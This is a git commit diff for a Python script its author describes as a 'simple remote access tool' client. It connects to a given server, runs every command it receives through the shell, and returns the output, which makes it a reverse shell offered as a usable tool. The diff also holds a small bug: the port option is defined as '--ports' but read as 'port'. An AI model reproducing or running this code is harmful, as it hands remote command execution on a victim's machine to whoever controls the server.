37c62f37303af68577d9af1f9e07b12c3e6316a1
keegan.ridgley <keegan.ridgley@orthofi.com>
2018-07-01 19:26:25 -0600

    adding v_client parse

--- ipTools/v_client.py
+++ ipTools/v_client.py
@@ -8,26 +8,68 @@ def usage():
     exit(0)
 
 
-def execute_commmand(cmd):
+def execute_command(cmd):
     cmd = cmd.rstrip()
 
     try:
         results = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
     except Exception as e:
-        results = "Could not execute commnad: " + cmd
+        results = "[-] Error: Could not execute command => " + cmd
     return results
 
 
 def receive_data(client):
     try:
         while True:
-            recieved_cmd = ""
-            recieved_cmd += client.recv(4096)
+            received_cmd = ""
+            received_cmd += client.recv(4096)
 
-            if not recieved_cmd:
+            if not received_cmd:
                 continue
-            cmd_results = execute_commmand(recieved_cmd)
+            cmd_results = execute_command(received_cmd)
             client.send(cmd_results)
     except Exception as e:
         print("\n[-] Error:\n" + str(e))
         pass
+
+
+def client_connect(host, port):
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    try:
+        client.connect((host, port))
+        print("[+] Connected with the server ", host, " on port ", str(port))
+        receive_data(client)
+    except Exception as e:
+        print("\n[-] Error:\n" + str(e))
+        client.close()
+
+
+def parse():
+    """parse any arguments passed into the cmd line"""
+
+    parser = argparse.ArgumentParser(prog='v_client.py',
+                                     description='''Simple remote access tool - client''',
+                                     epilog='''Created by K''',
+                                     usage='%(prog)s [-a] address [-p] port'
+                                     )
+    parser.add_argument("-a", "--address", type=str, help="Server IP address")
+    parser.add_argument("-p", "--ports", type=int, default="9999", help="Port to connect with")
+
+    args = parser.parse_args()
+    if args.address == None:
+        usage()
+    target_host = args.address
+    port_number = args.port
+
+    return target_host, port_number
+
+
+def main():
+    target_host, port_number = parse()
+    client_connect(target_host, port_number)
+
+
+if __name__ == '__main__':
+    # call the main function
+    main()
